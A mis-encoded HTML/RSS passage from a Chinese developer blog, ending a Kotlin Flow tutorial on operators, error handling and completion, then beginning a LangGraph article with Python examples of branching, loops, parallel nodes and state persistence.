<table><thead><tr><th>æ“ä½œç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>collect { }</code></td><td>åŸºç¡€æ”¶é›†</td></tr><tr><td><code>toList()</code></td><td>æ”¶é›†æˆ Listï¼ˆæµ‹è¯•å¸¸ç”¨ï¼‰</td></tr><tr><td><code>first()</code></td><td>è·å–ç¬¬ä¸€ä¸ªå€¼å¹¶å–æ¶ˆ Flow</td></tr><tr><td><code>reduce { }</code>Â /Â <code>fold { }</code></td><td>èšåˆæ‰€æœ‰å€¼</td></tr><tr><td><code>launchIn(scope)</code></td><td>åœ¨æŒ‡å®šä½œç”¨åŸŸå¯åŠ¨æ”¶é›†ï¼ˆå·²å¼ƒç”¨ï¼Œæ”¹ç”¨Â <code>repeatOnLifecycle</code>ï¼‰</td></tr></tbody></table>
<h2 data-id="heading-39">åå…«ã€ç»„åˆæ“ä½œç¬¦</h2>
<p>è§ç¬¬åå››ï¼ˆåˆå¹¶ä¸æœ€æ–°å€¼ï¼‰ï¼Œæ­¤å¤„ä¸å†é‡å¤ã€‚</p>
<h2 data-id="heading-40">åå…«ã€å±•å¹³æ“ä½œç¬¦</h2>
<p>ç”¨äºå¤„ç† <strong>Flow<code>&lt;Flow&gt;</code></strong> ç»“æ„ï¼š</p>





























<table><thead><tr><th>æ“ä½œç¬¦</th><th>è¡Œä¸º</th></tr></thead><tbody><tr><td><code>flattenConcat()</code></td><td>ä¸²è¡Œå±•å¼€ï¼ˆç­‰ç¬¬ä¸€ä¸ª Flow ç»“æŸå†å¤„ç†ç¬¬äºŒä¸ªï¼‰</td></tr><tr><td><code>flattenMerge()</code></td><td>å¹¶è¡Œå±•å¼€ï¼ˆåŒæ—¶ collect æ‰€æœ‰å­ Flowï¼‰</td></tr><tr><td><code>flatMapConcat()</code></td><td><code>map + flattenConcat</code></td></tr><tr><td><code>flatMapMerge()</code></td><td><code>map + flattenMerge</code></td></tr><tr><td><code>flatMapLatest()</code></td><td><code>map + åªä¿ç•™æœ€æ–°å­ Flow</code>Â âœ… æœ€å¸¸ç”¨</td></tr></tbody></table>
<h3 data-id="heading-41"><code>flatMapLatest</code>Â å†æ¬¡å¼ºè°ƒï¼ˆæœç´¢åœºæ™¯ï¼‰ï¼š</h3>
<pre><code class="hljs language-kotlin" lang="kotlin">queries
    .flatMapLatest { query -&gt;
        api.search(query) <span class="hljs-comment">// è¿”å› Flow&lt;SearchResult&gt;</span>
    }
    .collect { results -&gt;
        updateUI(results)
    }
</code></pre>
<p>å½“ç”¨æˆ·è¾“å…¥ â€œaâ€ â†’ â€œabâ€ â†’ â€œabcâ€ï¼š</p>
<ul>
<li>
<p>â€œaâ€ çš„è¯·æ±‚å‘å‡º</p>
</li>
<li>
<p>è¾“å…¥ â€œabâ€ï¼Œ<strong>è‡ªåŠ¨å–æ¶ˆ â€œaâ€ çš„è¯·æ±‚</strong>ï¼Œå‘å‡º â€œabâ€</p>
</li>
<li>
<p>è¾“å…¥ â€œabcâ€ï¼Œ<strong>è‡ªåŠ¨å–æ¶ˆ â€œabâ€ çš„è¯·æ±‚</strong>ï¼Œå‘å‡º â€œabcâ€</p>
</li>
</ul>
<h2 data-id="heading-42">åä¹ã€æµçš„å¼‚å¸¸å¤„ç†</h2>
<p>Flow ä¸­çš„å¼‚å¸¸å¤„ç†æœ‰ä¸¤ç§æ–¹å¼ï¼š</p>
<h3 data-id="heading-43">1. åœ¨æ”¶é›†ç«¯ try-catchï¼ˆæ¨èï¼‰</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">try</span> {
    api.dataFlow.collect { ... }
} <span class="hljs-keyword">catch</span> (e: IOException) {
    showError(e.message)
}
</code></pre>
<h3 data-id="heading-44">2. ä½¿ç”¨Â <code>catch</code>Â æ“ä½œç¬¦ï¼ˆå¯ emit å…œåº•å€¼ï¼‰</h3>
<pre><code class="hljs language-kotlin" lang="kotlin">api.dataFlow
    .<span class="hljs-keyword">catch</span> { e -&gt;
        <span class="hljs-keyword">if</span> (e <span class="hljs-keyword">is</span> IOException) {
            emit(emptyData()) <span class="hljs-comment">// æä¾›é»˜è®¤å€¼</span>
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">throw</span> e <span class="hljs-comment">// é‡æ–°æŠ›å‡º</span>
        }
    }
    .collect { render(it) }
</code></pre>
<h3 data-id="heading-45">3. é‡è¯•ï¼š<code>retry</code>,Â <code>retryWhen</code></h3>
<pre><code class="hljs language-kotlin" lang="kotlin">api.dataFlow
    .retry(<span class="hljs-number">3</span>) { it <span class="hljs-keyword">is</span> IOException }
    .collect { ... }
</code></pre>
<p>æ³¨æ„ï¼š<code>catch</code> <strong>åªèƒ½æ•è·ä¸Šæ¸¸å¼‚å¸¸</strong>ï¼Œä¸èƒ½æ•è· <code>collect</code> å—å†…çš„å¼‚å¸¸ï¼</p>
<h2 data-id="heading-46">äºŒåã€æµçš„å®Œæˆï¼ˆCompletionï¼‰</h2>
<p>Flow æ­£å¸¸ç»“æŸæ—¶ï¼Œå¯é€šè¿‡ <code>onCompletion</code> æ‰§è¡Œæ¸…ç†ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">counterFlow
    .onCompletion { cause -&gt;
        <span class="hljs-keyword">if</span> (cause == <span class="hljs-literal">null</span>) {
            println(<span class="hljs-string">"Flow completed normally"</span>)
        } <span class="hljs-keyword">else</span> {
            println(<span class="hljs-string">"Flow failed: <span class="hljs-variable">$cause</span>"</span>)
        }
    }
    .collect { ... }
</code></pre>
<ul>
<li><code>cause == null</code>Â â†’ æ­£å¸¸ç»“æŸï¼ˆemit å®Œæ¯•ï¼‰</li>
<li><code>cause is CancellationException</code>Â â†’ è¢«å–æ¶ˆ</li>
<li><code>cause is Exception</code>Â â†’ å‘ç”Ÿé”™è¯¯</li>
</ul>
<p>é€‚åˆåšæ—¥å¿—ã€èµ„æºé‡Šæ”¾ç­‰æ”¶å°¾å·¥ä½œã€‚</p>
<h2 data-id="heading-47">äºŒåä¸€ã€ç”Ÿå‘½å‘¨æœŸå®‰å…¨ repeatOnLifecycle + lifecycleScope</h2>
<h3 data-id="heading-48">1. ä¸ºä»€ä¹ˆéœ€è¦â€œç”Ÿå‘½å‘¨æœŸå®‰å…¨</h3>
<h3 data-id="heading-49">2. é”™è¯¯åšæ³•</h3>
<h3 data-id="heading-50">3. æ­£ç¡®åšæ³•ï¼š<code>repeatOnLifecycle</code>Â +Â <code>lifecycleScope</code></h3>
<h2 data-id="heading-51">æ€»ç»“</h2>

































<table><thead><tr><th>æ¦‚å¿µ</th><th>å…³é”®ç‚¹</th></tr></thead><tbody><tr><td><strong>å†·æµ</strong></td><td>æ¯æ¬¡ collect é‡æ–°æ‰§è¡Œ</td></tr><tr><td><strong>ç»“æ„åŒ–å¹¶å‘</strong></td><td>è‡ªåŠ¨å–æ¶ˆï¼Œé¿å…æ³„æ¼</td></tr><tr><td><strong>èƒŒå‹å¤„ç†</strong></td><td><code>buffer()</code>,Â <code>conflate()</code>,Â <code>collectLatest</code></td></tr><tr><td><strong>ç”Ÿå‘½å‘¨æœŸå®‰å…¨</strong></td><td><code>repeatOnLifecycle</code>Â +Â <code>lifecycleScope</code></td></tr><tr><td><strong>å¼‚å¸¸å¤„ç†</strong></td><td><code>catch</code>Â +Â <code>retry</code>Â + æ”¶é›†ç«¯ try-catch</td></tr><tr><td><strong>çƒ­æµå‡çº§</strong></td><td>ç”¨Â <code>stateIn</code>Â /Â <code>shareIn</code>Â å°†å†·æµè½¬çƒ­æµ</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LangGraph å·¥ä½œæµä¸­å¸¸ç”¨çš„æ ¸å¿ƒç­–ç•¥]]></title>    <link>https://juejin.cn/post/7588745319401553920</link>    <guid>https://juejin.cn/post/7588745319401553920</guid>    <pubDate>2025-12-29T03:28:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588745319401553920" data-draft-id="7588730836864729103" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LangGraph å·¥ä½œæµä¸­å¸¸ç”¨çš„æ ¸å¿ƒç­–ç•¥"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-29T03:28:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ™ºèƒ½ç –å¤´"/> <meta itemprop="url" content="https://juejin.cn/user/4088405368247296"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LangGraph å·¥ä½œæµä¸­å¸¸ç”¨çš„æ ¸å¿ƒç­–ç•¥
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4088405368247296/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ™ºèƒ½ç –å¤´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T03:28:04.000Z" title="Mon Dec 29 2025 03:28:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>LangGraph å·¥ä½œæµä¸­å¯ä»¥ä½¿ç”¨çš„æ ¸å¿ƒç­–ç•¥ï¼Œè¿™äº›ç­–ç•¥èƒ½å¸®åŠ©ä½ æ›´çµæ´»ã€é«˜æ•ˆåœ°è®¾è®¡å’Œè¿è¡ŒåŸºäº LangGraph çš„æ™ºèƒ½ä½“æˆ–å·¥ä½œæµåº”ç”¨ã€‚</p>
<p>LangGraph ä½œä¸ºä¸“é—¨ä¸ºæ„å»ºå¤šæ­¥éª¤ã€æœ‰çŠ¶æ€ã€å¯å¾ªç¯çš„ LLM åº”ç”¨è®¾è®¡çš„æ¡†æ¶ï¼Œå…¶æ ¸å¿ƒä»·å€¼å°±ä½“ç°åœ¨çµæ´»çš„å·¥ä½œæµç­–ç•¥ä¸Šã€‚ä»¥ä¸‹æ˜¯æœ€å¸¸ç”¨ä¸”å®ç”¨çš„æ ¸å¿ƒç­–ç•¥ï¼Œæˆ‘ä¼šç»“åˆåœºæ™¯å’Œä»£ç ç¤ºä¾‹æ¥è§£é‡Šï¼š</p>
<h3 data-id="heading-0">ä¸€ã€æ ¸å¿ƒå·¥ä½œæµç­–ç•¥</h3>
<h4 data-id="heading-1">1. æ¡ä»¶åˆ†æ”¯ç­–ç•¥ï¼ˆConditional Branchingï¼‰</h4>
<p>è¿™æ˜¯æœ€åŸºç¡€ä¹Ÿæœ€å¸¸ç”¨çš„ç­–ç•¥ï¼Œæ ¹æ®èŠ‚ç‚¹æ‰§è¡Œçš„ç»“æœåŠ¨æ€å†³å®šä¸‹ä¸€æ­¥æ‰§è¡Œå“ªä¸ªèŠ‚ç‚¹ï¼Œå®ç° â€œå†³ç­–æ ‘â€ å¼çš„å·¥ä½œæµã€‚</p>
<ul>
<li>é€‚ç”¨åœºæ™¯ï¼šæ™ºèƒ½ä½“åˆ¤æ–­æ˜¯å¦éœ€è¦è°ƒç”¨å·¥å…·ã€æ˜¯å¦éœ€è¦è¿½é—®ç”¨æˆ·ã€æ˜¯å¦å®Œæˆä»»åŠ¡ç­‰ã€‚</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph.graph <span class="hljs-keyword">import</span> StateGraph, END
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> TypedDict, Annotated
<span class="hljs-keyword">import</span> operator

<span class="hljs-comment"># å®šä¹‰çŠ¶æ€</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentState</span>(<span class="hljs-title class_ inherited__">TypedDict</span>):
    query: <span class="hljs-built_in">str</span>
    need_tool: <span class="hljs-built_in">bool</span>
    tool_result: <span class="hljs-built_in">str</span>
    final_answer: <span class="hljs-built_in">str</span>

<span class="hljs-comment"># å®šä¹‰èŠ‚ç‚¹</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">check_need_tool</span>(<span class="hljs-params">state: AgentState</span>) -&gt; AgentState:
    <span class="hljs-comment"># æ¨¡æ‹Ÿåˆ¤æ–­æ˜¯å¦éœ€è¦è°ƒç”¨å·¥å…·</span>
    state[<span class="hljs-string">"need_tool"</span>] = <span class="hljs-string">"calculator"</span> <span class="hljs-keyword">in</span> state[<span class="hljs-string">"query"</span>].lower()
    <span class="hljs-keyword">return</span> state

<span class="hljs-keyword">def</span> <span class="hljs-title function_">call_tool</span>(<span class="hljs-params">state: AgentState</span>) -&gt; AgentState:
    <span class="hljs-comment"># æ¨¡æ‹Ÿè°ƒç”¨å·¥å…·</span>
    state[<span class="hljs-string">"tool_result"</span>] = <span class="hljs-string">"è®¡ç®—ç»“æœï¼š100"</span>
    <span class="hljs-keyword">return</span> state

<span class="hljs-keyword">def</span> <span class="hljs-title function_">direct_answer</span>(<span class="hljs-params">state: AgentState</span>) -&gt; AgentState:
    <span class="hljs-comment"># ç›´æ¥å›ç­”</span>
    state[<span class="hljs-string">"final_answer"</span>] = <span class="hljs-string">f"æ— éœ€å·¥å…·ï¼Œå›ç­”ï¼š<span class="hljs-subst">{state[<span class="hljs-string">'query'</span>]}</span>"</span>
    <span class="hljs-keyword">return</span> state

<span class="hljs-comment"># å®šä¹‰åˆ†æ”¯é€»è¾‘ï¼ˆæ ¸å¿ƒç­–ç•¥ï¼‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">decide_next_step</span>(<span class="hljs-params">state: AgentState</span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-keyword">if</span> state[<span class="hljs-string">"need_tool"</span>]:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"call_tool"</span>  <span class="hljs-comment"># èµ°å·¥å…·è°ƒç”¨åˆ†æ”¯</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"direct_answer"</span>  <span class="hljs-comment"># èµ°ç›´æ¥å›ç­”åˆ†æ”¯</span>

<span class="hljs-comment"># æ„å»ºå·¥ä½œæµ</span>
graph_builder = StateGraph(AgentState)
graph_builder.add_node(<span class="hljs-string">"check_need_tool"</span>, check_need_tool)
graph_builder.add_node(<span class="hljs-string">"call_tool"</span>, call_tool)
graph_builder.add_node(<span class="hljs-string">"direct_answer"</span>, direct_answer)

<span class="hljs-comment"># è®¾ç½®å…¥å£å’Œåˆ†æ”¯</span>
graph_builder.set_entry_point(<span class="hljs-string">"check_need_tool"</span>)
graph_builder.add_conditional_edges(
    <span class="hljs-string">"check_need_tool"</span>,
    decide_next_step,  <span class="hljs-comment"># åˆ†æ”¯åˆ¤æ–­å‡½æ•°</span>
    {
        <span class="hljs-string">"call_tool"</span>: <span class="hljs-string">"call_tool"</span>,
        <span class="hljs-string">"direct_answer"</span>: <span class="hljs-string">"direct_answer"</span>,
    },
)

<span class="hljs-comment"># åˆ†æ”¯èŠ‚ç‚¹æœ€ç»ˆéƒ½æŒ‡å‘ç»“æŸ</span>
graph_builder.add_edge(<span class="hljs-string">"call_tool"</span>, END)
graph_builder.add_edge(<span class="hljs-string">"direct_answer"</span>, END)

<span class="hljs-comment"># ç¼–è¯‘å¹¶è¿è¡Œ</span>
graph = graph_builder.<span class="hljs-built_in">compile</span>()
result = graph.invoke({<span class="hljs-string">"query"</span>: <span class="hljs-string">"è®¡ç®—1+99çš„ç»“æœ"</span>})
<span class="hljs-built_in">print</span>(result[<span class="hljs-string">"final_answer"</span>] <span class="hljs-keyword">if</span> <span class="hljs-string">"final_answer"</span> <span class="hljs-keyword">in</span> result <span class="hljs-keyword">else</span> result[<span class="hljs-string">"tool_result"</span>])
</code></pre>
<h4 data-id="heading-2">2. å¾ªç¯ / è¿­ä»£ç­–ç•¥ï¼ˆLoop/Iterationï¼‰</h4>
<p>è®©å·¥ä½œæµåœ¨æ»¡è¶³ç‰¹å®šæ¡ä»¶å‰é‡å¤æ‰§è¡ŒæŸç»„èŠ‚ç‚¹ï¼ˆæ ¸å¿ƒæ˜¯ â€œè‡ªç¯â€ æˆ– â€œå¾ªç¯è¾¹â€ï¼‰ï¼Œæ˜¯æ™ºèƒ½ä½“ â€œæ€è€ƒ - æ‰§è¡Œ - åæ€â€ çš„æ ¸å¿ƒå®ç°æ–¹å¼ã€‚</p>
<ul>
<li>é€‚ç”¨åœºæ™¯ï¼šå·¥å…·è°ƒç”¨åæ£€æŸ¥ç»“æœæ˜¯å¦æ»¡è¶³éœ€æ±‚ã€å¤šè½®å¯¹è¯è¿½é—®ã€ä»»åŠ¡åˆ†æ­¥æ‰§è¡Œç›´åˆ°å®Œæˆã€‚</li>
</ul>
<p>å…³é”®é€»è¾‘ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ–°å¢ï¼šæ£€æŸ¥å·¥å…·ç»“æœæ˜¯å¦æ»¡è¶³è¦æ±‚</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">check_tool_result</span>(<span class="hljs-params">state: AgentState</span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-comment"># æ¨¡æ‹Ÿåˆ¤æ–­ï¼šå¦‚æœç»“æœä¸ºç©º/é”™è¯¯ï¼Œé‡æ–°è°ƒç”¨å·¥å…·ï¼›å¦åˆ™ç»“æŸ</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> state[<span class="hljs-string">"tool_result"</span>] <span class="hljs-keyword">or</span> state[<span class="hljs-string">"tool_result"</span>] == <span class="hljs-string">"é”™è¯¯"</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"call_tool"</span>  <span class="hljs-comment"># å¾ªç¯ï¼šé‡æ–°è°ƒç”¨å·¥å…·</span>
    <span class="hljs-keyword">else</span>:
        state[<span class="hljs-string">"final_answer"</span>] = <span class="hljs-string">f"æœ€ç»ˆç­”æ¡ˆï¼š<span class="hljs-subst">{state[<span class="hljs-string">'tool_result'</span>]}</span>"</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"end"</span>  <span class="hljs-comment"># ç»“æŸ</span>

<span class="hljs-comment"># è°ƒæ•´å·¥ä½œæµï¼šcall_tool åå…ˆæ£€æŸ¥ç»“æœï¼Œå†å†³å®šå¾ªç¯æˆ–ç»“æŸ</span>
graph_builder.add_conditional_edges(
    <span class="hljs-string">"call_tool"</span>,
    check_tool_result,
    {
        <span class="hljs-string">"call_tool"</span>: <span class="hljs-string">"call_tool"</span>,  <span class="hljs-comment"># è‡ªç¯ï¼šå¾ªç¯è°ƒç”¨å·¥å…·</span>
        <span class="hljs-string">"end"</span>: END,
    },
)
</code></pre>
<h4 data-id="heading-3">3. å¹¶è¡Œæ‰§è¡Œç­–ç•¥ï¼ˆParallel Executionï¼‰</h4>
<p>è®©å¤šä¸ªèŠ‚ç‚¹åŒæ—¶æ‰§è¡Œï¼ˆè€Œéä¸²è¡Œï¼‰ï¼Œæå‡å·¥ä½œæµæ•ˆç‡ï¼ŒLangGraph æä¾›å¹¶è¡Œè¾¹èƒ½åŠ›ã€‚</p>
<ul>
<li>é€‚ç”¨åœºæ™¯ï¼šåŒæ—¶è°ƒç”¨å¤šä¸ªå·¥å…·ï¼ˆå¦‚åŒæ—¶æŸ¥å¤©æ°”å’ŒæŸ¥æ±‡ç‡ï¼‰ã€å¹¶è¡Œå¤„ç†å¤šä»½æ•°æ®ã€å¤šç»´åº¦åˆ†æåŒä¸€ä¸ªé—®é¢˜ã€‚</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ–°å¢å¹¶è¡ŒèŠ‚ç‚¹</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">check_weather</span>(<span class="hljs-params">state: AgentState</span>) -&gt; AgentState:
    state[<span class="hljs-string">"weather"</span>] = <span class="hljs-string">"åŒ—äº¬ï¼š25â„ƒï¼Œæ™´"</span>
    <span class="hljs-keyword">return</span> state

<span class="hljs-keyword">def</span> <span class="hljs-title function_">check_exchange_rate</span>(<span class="hljs-params">state: AgentState</span>) -&gt; AgentState:
    state[<span class="hljs-string">"exchange_rate"</span>] = <span class="hljs-string">"1ç¾å…ƒ=7.2äººæ°‘å¸"</span>
    <span class="hljs-keyword">return</span> state

<span class="hljs-comment"># æ„å»ºå¹¶è¡Œå·¥ä½œæµ</span>
graph_builder.add_node(<span class="hljs-string">"check_weather"</span>, check_weather)
graph_builder.add_node(<span class="hljs-string">"check_exchange_rate"</span>, check_exchange_rate)

<span class="hljs-comment"># è®¾ç½®å¹¶è¡Œè¾¹ï¼šå…¥å£èŠ‚ç‚¹ååŒæ—¶æ‰§è¡Œä¸¤ä¸ªèŠ‚ç‚¹</span>
graph_builder.add_parallel_edges(
    <span class="hljs-string">"check_need_tool"</span>,  <span class="hljs-comment"># ä¸Šæ¸¸èŠ‚ç‚¹</span>
    [<span class="hljs-string">"check_weather"</span>, <span class="hljs-string">"check_exchange_rate"</span>],  <span class="hljs-comment"># å¹¶è¡Œæ‰§è¡Œçš„èŠ‚ç‚¹åˆ—è¡¨</span>
)

<span class="hljs-comment"># å¹¶è¡ŒèŠ‚ç‚¹æ‰§è¡Œå®Œåæ±‡æ€»ç»“æœ</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">summarize_parallel_results</span>(<span class="hljs-params">state: AgentState</span>) -&gt; AgentState:
    state[<span class="hljs-string">"final_answer"</span>] = <span class="hljs-string">f"å¤©æ°”ï¼š<span class="hljs-subst">{state[<span class="hljs-string">'weather'</span>]}</span>ï¼›æ±‡ç‡ï¼š<span class="hljs-subst">{state[<span class="hljs-string">'exchange_rate'</span>]}</span>"</span>
    <span class="hljs-keyword">return</span> state

graph_builder.add_node(<span class="hljs-string">"summarize"</span>, summarize_parallel_results)
graph_builder.add_edge(<span class="hljs-string">"check_weather"</span>, <span class="hljs-string">"summarize"</span>)
graph_builder.add_edge(<span class="hljs-string">"check_exchange_rate"</span>, <span class="hljs-string">"summarize"</span>)
graph_builder.add_edge(<span class="hljs-string">"summarize"</span>, END)
</code></pre>
<h4 data-id="heading-4">4. çŠ¶æ€æŒä¹…åŒ–ç­–ç•¥ï¼ˆState Persistenceï¼‰</h4>
<p>LangGraph æ ¸å¿ƒç‰¹æ€§ä¹‹ä¸€ï¼Œé€šè¿‡æŒä¹…åŒ–å·¥ä½œæµçš„çŠ¶æ€ï¼ˆå¦‚ä½¿ç”¨ <code>MemorySaver</code>ï¼‰ï¼Œå®ç° â€œæ–­ç‚¹ç»­è·‘â€ æˆ– â€œå¤šè½®å¯¹è¯è®°å¿†â€ã€‚</p>
<ul>
<li>é€‚ç”¨åœºæ™¯ï¼šé•¿å¯¹è¯æ™ºèƒ½ä½“ã€åˆ†æ­¥æ‰§è¡Œçš„å¤æ‚ä»»åŠ¡ï¼ˆå¦‚ä¸­é€”ä¸­æ–­åç»§ç»­ï¼‰ã€å¤šç”¨æˆ·ä¼šè¯éš”ç¦»ã€‚</li>
</ul>
<p>å…³é”®é…ç½®ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph.checkpoint.memory <span class="hljs-keyword">import</span> MemorySaver

<span class="hljs-comment"># åˆå§‹åŒ–å†…å­˜å­˜å‚¨ï¼ˆä¹Ÿå¯ä½¿ç”¨ Redisã€SQL ç­‰æŒä¹…åŒ–å­˜å‚¨ï¼‰</span>
memory = MemorySaver()

<span class="hljs-comment"># ç¼–è¯‘æ—¶ä¼ å…¥ checkpointerï¼Œå¼€å¯çŠ¶æ€æŒä¹…åŒ–</span>
graph = graph_builder.<span class="hljs-built_in">compile</span>(checkpointer=memory)

